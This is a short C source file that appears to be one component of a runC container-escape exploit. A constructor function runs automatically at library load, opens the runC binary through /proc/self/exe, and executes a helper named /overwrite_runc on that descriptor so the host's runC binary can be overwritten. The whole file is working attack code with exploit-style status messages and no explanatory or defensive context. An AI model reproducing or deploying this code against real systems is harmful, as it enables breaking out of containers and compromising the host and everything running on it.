
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

__attribute__ ((constructor)) void run_at_link(void)
{
    char *argv_overwrite[3];
    char buf[128];

    /* Open the runC binary for reading */
    int runc_fd_read = open("/proc/self/exe", O_RDONLY);
    if (runc_fd_read == -1 ) {
        printf("[!] can't open /proc/self/exe\n");
        return;
    }
    printf("[+] Opened runC for reading as /proc/self/fd/%d\n", runc_fd_read);
    fflush(stdout);
    
    /* Prepare overwrite_runc arguments: ['overwrite_runc', '/proc/self/fd/runc_fd_read'] */
    argv_overwrite[0] = strdup("/overwrite_runc");
    snprintf(buf, 128, "/proc/self/fd/%d", runc_fd_read);
    argv_overwrite[1] = buf;
    argv_overwrite[2] = 0;

    printf("[+] Calling overwrite_runc\n");
    fflush(stdout);
    /* Execute overwrite_runc */
    execve("/overwrite_runc", argv_overwrite, NULL);
}

